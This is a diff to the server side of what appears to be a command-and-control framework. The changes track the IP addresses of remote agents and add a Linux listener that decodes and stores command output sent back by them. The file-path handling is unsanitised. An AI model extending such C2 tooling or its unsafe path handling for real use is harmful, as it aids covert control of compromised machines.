@@ -21,6 +21,8 @@ import threading
 import sys
 from multiprocessing import Process
 from django.contrib.auth.models import User
+from django.core.files.storage import FileSystemStorage
+
 #from django.contrib.auth.models import Permission
 listen_path = os.path.dirname(os.path.abspath(__file__))+"/Modules/windows/data/listeners/"
 app         = Flask(__name__)
@@ -52,12 +54,16 @@ def get_client_ip(request):
 def registerAgent(request):
     if request.method=='POST':
         hostname = request.POST['hname']
+        remoteip = (get_client_ip(request))
         if Agent.objects.filter(hname = hostname).exists():
             data = Agent.objects.get(hname = hostname)
             agentname = data.name
+            if data.ip != remoteip:
+                data.ip = remoteip
+                data.save()
         else:
             agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
-        remoteip = (get_client_ip(request))
+        
         eth = request.POST['eth']
         if Agent.objects.filter(hname = hostname).exists():
             pass
@@ -183,13 +189,23 @@ class Listener():
                 resultspath = listen_path+"agents/{}/results".format(name)
                 result = request.POST['result']
                 with open(resultspath,'a') as r:
-                    r.write(result) 
+                    r.write(result)     
                     r.close()
                 return HttpResponse('')
             else:
                 return HttpResponse('')
 
-
+        def LinreceiveResults(request,name=''):
+            resultspath = listen_path+"agents/{}/results".format(name)
+            if request.method == 'POST':
+                result = request.body.decode('base64')
+                print(result)
+                with open(resultspath,'a') as r:
+                    r.write(result) 
+                    r.close()
+                return HttpResponse('')
+            else:
+                return HttpResponse('')
 
 
 
